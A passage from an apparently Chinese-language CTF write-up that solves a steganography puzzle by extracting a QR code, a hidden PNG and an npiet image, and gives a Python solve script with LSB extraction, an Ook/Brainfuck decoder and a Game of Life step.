</span></span><span class=line><span class=cl>    <span class=n>img</span><span class=o>.</span><span class=n>show</span><span class=p>()</span></span></span></code></pre></td></tr></table></div></div><p>运行以上脚本后即可得到下面这张 QRcode</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20260109161041893.png alt=/posts/bb1da35/imgs/image-20260109161041893.png height=744 width=1416></p><p>扫码得到：<code>flag{th1s_ch</code></p><p>然后我们继续去看这张 png，010 打开发现有两个 IDAT 块</p><p>并且尝试把第二个 IDAT 块删除后，发现图片显示内容，因此猜测这个 IDAT 块隐写数据了</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20260109161336605.png alt=/posts/bb1da35/imgs/image-20260109161336605.png height=2110 width=3234></p><p>手动提取出来解码一下，发现是藏了另一张 png</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20260109161525012.png alt=/posts/bb1da35/imgs/image-20260109161525012.png height=1086 width=2916></p><p>两张图片的长宽是一样的，经过尝试发现用 stegsolve 把两张图片的像素 xor 后可以得到一个 npiet</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20260109161655770.png alt=/posts/bb1da35/imgs/image-20260109161655770.png height=732 width=1292></p><p>保存后用在线网站解一下即可得到第三段 flag：<code>h4rd_af_:(}</code></p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20260109161737649.png alt=/posts/bb1da35/imgs/image-20260109161737649.png height=1164 width=2320></p><p>综合以上三段flag，本题最后的 flag 为：<code>flag{th1s_ch4ll3n9e_is_h4rd_af_:(}</code></p><p>附：完整解题脚本</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span><span class=lnt>144
</span><span class=lnt>145
</span><span class=lnt>146
</span><span class=lnt>147
</span><span class=lnt>148
</span><span class=lnt>149
</span><span class=lnt>150
</span><span class=lnt>151
</span><span class=lnt>152
</span><span class=lnt>153
</span><span class=lnt>154
</span><span class=lnt>155
</span><span class=lnt>156
</span><span class=lnt>157
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1>#  题目名称: 最后的R.G!B?</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>numpy</span> <span class=k>as</span> <span class=nn>np</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>PIL</span> <span class=kn>import</span> <span class=n>Image</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>func1</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>img</span> <span class=o>=</span> <span class=n>Image</span><span class=o>.</span><span class=n>open</span><span class=p>(</span><span class=s2>&#34;rgb.png&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>w</span><span class=p>,</span> <span class=n>h</span> <span class=o>=</span> <span class=n>img</span><span class=o>.</span><span class=n>size</span>
</span></span><span class=line><span class=cl>    <span class=n>short_ook</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 1. 提取 LSB (Bit 0) 并映射为 Short Ook!</span>
</span></span><span class=line><span class=cl>    <span class=c1># R -&gt; . G -&gt; ! B -&gt; ?</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>y</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>h</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>x</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>w</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>r</span><span class=p>,</span> <span class=n>g</span><span class=p>,</span> <span class=n>b</span><span class=p>,</span> <span class=n>a</span> <span class=o>=</span> <span class=n>img</span><span class=o>.</span><span class=n>getpixel</span><span class=p>((</span><span class=n>x</span><span class=p>,</span> <span class=n>y</span><span class=p>))</span>
</span></span><span class=line><span class=cl>            <span class=c1># 检查 R, G, B 的第 0 位</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>r</span> <span class=o>&amp;</span> <span class=mi>1</span><span class=p>:</span> <span class=n>short_ook</span> <span class=o>+=</span> <span class=s1>&#39;.&#39;</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>g</span> <span class=o>&amp;</span> <span class=mi>1</span><span class=p>:</span> <span class=n>short_ook</span> <span class=o>+=</span> <span class=s1>&#39;!&#39;</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>b</span> <span class=o>&amp;</span> <span class=mi>1</span><span class=p>:</span> <span class=n>short_ook</span> <span class=o>+=</span> <span class=s1>&#39;?&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[+] 提取出的 Short Ook! 的长度: </span><span class=si>{</span><span class=nb>len</span><span class=p>(</span><span class=n>short_ook</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>short_ook</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 2. 将 Short Ook! 转换为 Brainfuck</span>
</span></span><span class=line><span class=cl>    <span class=n>ook_map</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;.?&#34;</span><span class=p>:</span> <span class=s2>&#34;&gt;&#34;</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>        <span class=s2>&#34;?.&#34;</span><span class=p>:</span> <span class=s2>&#34;&lt;&#34;</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>        <span class=s2>&#34;..&#34;</span><span class=p>:</span> <span class=s2>&#34;+&#34;</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>        <span class=s2>&#34;!!&#34;</span><span class=p>:</span> <span class=s2>&#34;-&#34;</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>        <span class=s2>&#34;!.&#34;</span><span class=p>:</span> <span class=s2>&#34;.&#34;</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>        <span class=s2>&#34;.!&#34;</span><span class=p>:</span> <span class=s2>&#34;,&#34;</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>        <span class=s2>&#34;!?&#34;</span><span class=p>:</span> <span class=s2>&#34;[&#34;</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>        <span class=s2>&#34;?!&#34;</span><span class=p>:</span> <span class=s2>&#34;]&#34;</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>        <span class=s2>&#34;??&#34;</span><span class=p>:</span> <span class=s2>&#34;]&#34;</span>  <span class=c1># 题目中的特殊变体</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>bf_code</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=nb>len</span><span class=p>(</span><span class=n>short_ook</span><span class=p>)</span> <span class=o>-</span> <span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>pair</span> <span class=o>=</span> <span class=n>short_ook</span><span class=p>[</span><span class=n>i</span><span class=p>:</span><span class=n>i</span><span class=o>+</span><span class=mi>2</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>pair</span> <span class=ow>in</span> <span class=n>ook_map</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>bf_code</span> <span class=o>+=</span> <span class=n>ook_map</span><span class=p>[</span><span class=n>pair</span><span class=p>]</span>
</span></span><span class=line><span class=cl>            <span class=n>i</span> <span class=o>+=</span> <span class=mi>2</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>i</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>            
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>[+] 转换后的 Brainfuck 的长度: </span><span class=si>{</span><span class=nb>len</span><span class=p>(</span><span class=n>bf_code</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>bf_code</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 3. 自实现 Brainfuck 解释器</span>
</span></span><span class=line><span class=cl>    <span class=c1># 监控内存清零操作 [-]，在清零前读取数据</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>tape</span> <span class=o>=</span> <span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>*</span> <span class=mi>30000</span>
</span></span><span class=line><span class=cl>    <span class=n>ptr</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=n>code_ptr</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=n>bracket_map</span> <span class=o>=</span> <span class=p>{}</span>
</span></span><span class=line><span class=cl>    <span class=n>loop_stack</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 预处理跳转表</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>idx</span><span class=p>,</span> <span class=n>char</span> <span class=ow>in</span> <span class=nb>enumerate</span><span class=p>(</span><span class=n>bf_code</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>char</span> <span class=o>==</span> <span class=s1>&#39;[&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>loop_stack</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>idx</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>char</span> <span class=o>==</span> <span class=s1>&#39;]&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>loop_stack</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>start</span> <span class=o>=</span> <span class=n>loop_stack</span><span class=o>.</span><span class=n>pop</span><span class=p>()</span>
</span></span><span class=line><span class=cl>                <span class=n>bracket_map</span><span class=p>[</span><span class=n>start</span><span class=p>]</span> <span class=o>=</span> <span class=n>idx</span>
</span></span><span class=line><span class=cl>                <span class=n>bracket_map</span><span class=p>[</span><span class=n>idx</span><span class=p>]</span> <span class=o>=</span> <span class=n>start</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>extracted_res</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>steps</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=n>max_steps</span> <span class=o>=</span> <span class=mi>1000000</span> <span class=c1># 防止死循环</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=n>code_ptr</span> <span class=o>&lt;</span> <span class=nb>len</span><span class=p>(</span><span class=n>bf_code</span><span class=p>)</span> <span class=ow>and</span> <span class=n>steps</span> <span class=o>&lt;</span> <span class=n>max_steps</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=c1># 如果当前指令是 &#39;[&#39; 且后面紧跟着 &#39;-&#39; 和 &#39;]&#39;，即 &#34;[-]&#34; (清零操作)</span>
</span></span><span class=line><span class=cl>        <span class=c1># 这通常意味着当前的 tape[ptr] 里的值是刚刚计算完的临时变量</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>bf_code</span><span class=p>[</span><span class=n>code_ptr</span><span class=p>:</span><span class=n>code_ptr</span><span class=o>+</span><span class=mi>3</span><span class=p>]</span> <span class=o>==</span> <span class=s1>&#39;[-]&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>val</span> <span class=o>=</span> <span class=n>tape</span><span class=p>[</span><span class=n>ptr</span><span class=p>]</span>
</span></span><span class=line><span class=cl>            <span class=c1># 如果这个值是可打印字符，就把它记录下来</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>val</span> <span class=o>!=</span> <span class=mi>0</span> <span class=ow>and</span> <span class=mi>32</span> <span class=o>&lt;=</span> <span class=n>val</span> <span class=o>&lt;=</span> <span class=mi>126</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>extracted_res</span> <span class=o>+=</span> <span class=nb>chr</span><span class=p>(</span><span class=n>val</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>cmd</span> <span class=o>=</span> <span class=n>bf_code</span><span class=p>[</span><span class=n>code_ptr</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>cmd</span> <span class=o>==</span> <span class=s1>&#39;&gt;&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>ptr</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>cmd</span> <span class=o>==</span> <span class=s1>&#39;&lt;&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>ptr</span> <span class=o>-=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>cmd</span> <span class=o>==</span> <span class=s1>&#39;+&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>tape</span><span class=p>[</span><span class=n>ptr</span><span class=p>]</span> <span class=o>=</span> <span class=p>(</span><span class=n>tape</span><span class=p>[</span><span class=n>ptr</span><span class=p>]</span> <span class=o>+</span> <span class=mi>1</span><span class=p>)</span> <span class=o>%</span> <span class=mi>256</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>cmd</span> <span class=o>==</span> <span class=s1>&#39;-&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>tape</span><span class=p>[</span><span class=n>ptr</span><span class=p>]</span> <span class=o>=</span> <span class=p>(</span><span class=n>tape</span><span class=p>[</span><span class=n>ptr</span><span class=p>]</span> <span class=o>-</span> <span class=mi>1</span><span class=p>)</span> <span class=o>%</span> <span class=mi>256</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>cmd</span> <span class=o>==</span> <span class=s1>&#39;.&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=c1># 正常的输出指令 (Bit 0 代码里没有这个，所以才需要 Hook)</span>
</span></span><span class=line><span class=cl>            <span class=k>pass</span> 
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>cmd</span> <span class=o>==</span> <span class=s1>&#39;,&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>pass</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>cmd</span> <span class=o>==</span> <span class=s1>&#39;[&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>tape</span><span class=p>[</span><span class=n>ptr</span><span class=p>]</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>code_ptr</span> <span class=o>=</span> <span class=n>bracket_map</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>code_ptr</span><span class=p>,</span> <span class=n>code_ptr</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>cmd</span> <span class=o>==</span> <span class=s1>&#39;]&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>tape</span><span class=p>[</span><span class=n>ptr</span><span class=p>]</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>code_ptr</span> <span class=o>=</span> <span class=n>bracket_map</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>code_ptr</span><span class=p>,</span> <span class=n>code_ptr</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=n>code_ptr</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>        <span class=n>steps</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>[+] 提取结果: </span><span class=si>{</span><span class=n>extracted_res</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>func2</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>pixel_list</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=n>a_list</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=n>img</span> <span class=o>=</span> <span class=n>Image</span><span class=o>.</span><span class=n>open</span><span class=p>(</span><span class=s2>&#34;rgb.png&#34;</span><span class=p>)</span>    
</span></span><span class=line><span class=cl>    <span class=n>w</span><span class=p>,</span><span class=n>h</span> <span class=o>=</span> <span class=n>img</span><span class=o>.</span><span class=n>size</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>y</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>h</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>x</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>w</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>r</span><span class=p>,</span> <span class=n>g</span><span class=p>,</span> <span class=n>b</span><span class=p>,</span> <span class=n>a</span> <span class=o>=</span> <span class=n>img</span><span class=o>.</span><span class=n>getpixel</span><span class=p>((</span><span class=n>x</span><span class=p>,</span> <span class=n>y</span><span class=p>))</span>
</span></span><span class=line><span class=cl>            <span class=n>a_list</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>a</span><span class=o>&amp;</span><span class=mi>1</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>bin_data</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>a_list</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 转换为32x32网格</span>
</span></span><span class=line><span class=cl>    <span class=n>grid</span> <span class=o>=</span> <span class=n>np</span><span class=o>.</span><span class=n>array</span><span class=p>([</span><span class=nb>int</span><span class=p>(</span><span class=n>bit</span><span class=p>)</span> <span class=k>for</span> <span class=n>bit</span> <span class=ow>in</span> <span class=n>bin_data</span><span class=p>[:</span><span class=mi>1024</span><span class=p>]])</span><span class=o>.</span><span class=n>reshape</span><span class=p>(</span><span class=mi>32</span><span class=p>,</span> <span class=mi>32</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 一次康威生命游戏迭代</span>
</span></span><span class=line><span class=cl>    <span class=n>new_grid</span> <span class=o>=</span> <span class=n>np</span><span class=o>.</span><span class=n>zeros</span><span class=p>((</span><span class=mi>32</span><span class=p>,</span> <span class=mi>32</span><span class=p>),</span> <span class=n>dtype</span><span class=o>=</span><span class=nb>int</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>32</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>32</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>neighbors</span> <span class=o>=</span> <span class=nb>sum</span><span class=p>(</span>
</span></span><span class=line><span class=cl>                <span class=n>grid</span><span class=p>[</span><span class=n>i</span><span class=o>+</span><span class=n>di</span><span class=p>][</span><span class=n>j</span><span class=o>+</span><span class=n>dj</span><span class=p>]</span> <span class=k>for</span> <span class=n>di</span> <span class=ow>in</span> <span class=p>(</span><span class=o>-</span><span class=mi>1</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>1</span><span class=p>)</span> <span class=k>for</span> <span class=n>dj</span> <span class=ow>in</span> <span class=p>(</span><span class=o>-</span><span class=mi>1</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=ow>not</span> <span class=p>(</span><span class=n>di</span> <span class=o>==</span> <span class=n>dj</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=ow>and</span> <span class=mi>0</span> <span class=o>&lt;=</span> <span class=n>i</span><span class=o>+</span><span class=n>di</span> <span class=o>&lt;</span> <span class=mi>32</span> <span class=ow>and</span> <span class=mi>0</span> <span class=o>&lt;=</span> <span class=n>j</span><span class=o>+</span><span class=n>dj</span> <span class=o>&lt;</span> <span class=mi>32</span>
</span></span><span class=line><span class=cl>            <span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>grid</span><span class=p>[</span><span class=n>i</span><span class=p>][</span><span class=n>j</span><span class=p>]:</span>
</span></span><span class=line><span class=cl>                <span class=n>new_grid</span><span class=p>[</span><span class=n>i</span><span class=p>][</span><span class=n>j</span><span class=p>]</span> <span class=o>=</span> <span class=mi>1</span> <span class=k>if</span> <span class=n>neighbors</span> <span class=ow>in</span> <span class=p>(</span><span class=mi>2</span><span class=p>,</span><span class=mi>3</span><span class=p>)</span> <span class=k>else</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>            <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>new_grid</span><span class=p>[</span><span class=n>i</span><span class=p>][</span><span class=n>j</span><span class=p>]</span> <span class=o>=</span> <span class=mi>1</span> <span class=k>if</span> <span class=n>neighbors</span> <span class=o>==</span> <span class=mi>3</span> <span class=k>else</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 生成二维码</span>
</span></span><span class=line><span class=cl>    <span class=n>img</span> <span class=o>=</span> <span class=n>Image</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=s1>&#39;RGB&#39;</span><span class=p>,</span> <span class=p>(</span><span class=mi>32</span><span class=p>,</span> <span class=mi>32</span><span class=p>))</span> 
</span></span><span class=line><span class=cl>    <span class=n>pixels</span> <span class=o>=</span> <span class=n>img</span><span class=o>.</span><span class=n>load</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>32</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>32</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>new_grid</span><span class=p>[</span><span class=n>i</span><span class=p>][</span><span class=n>j</span><span class=p>]</span> <span class=o>==</span> <span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>pixels</span><span class=p>[</span><span class=n>j</span><span class=p>,</span> <span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span>      <span class=c1># 黑色</span>
</span></span><span class=line><span class=cl>            <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>pixels</span><span class=p>[</span><span class=n>j</span><span class=p>,</span> <span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=p>(</span><span class=mi>255</span><span class=p>,</span> <span class=mi>255</span><span class=p>,</span> <span class=mi>255</span><span class=p>)</span> <span class=c1># 白色</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 放大到320x320，便于扫码</span>
</span></span><span class=line><span class=cl>    <span class=n>img</span> <span class=o>=</span> <span class=n>img</span><span class=o>.</span><span class=n>resize</span><span class=p>((</span><span class=mi>320</span><span class=p>,</span> <span class=mi>320</span><span class=p>),</span> <span class=n>Image</span><span class=o>.</span><span class=n>NEAREST</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>img</span><span class=o>.</span><span class=n>save</span><span class=p>(</span><span class=s2>&#34;output.png&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>img</span><span class=o>.</span><span class=n>show</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>func1</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>func2</span><span class=p>()</span></span></span></code></pre></td></tr></table></div></div><h2 class=heading-element id=题目名称-数据恢复溯源2025数信杯><span>题目名称 数据恢复溯源（2025数信杯）</span>
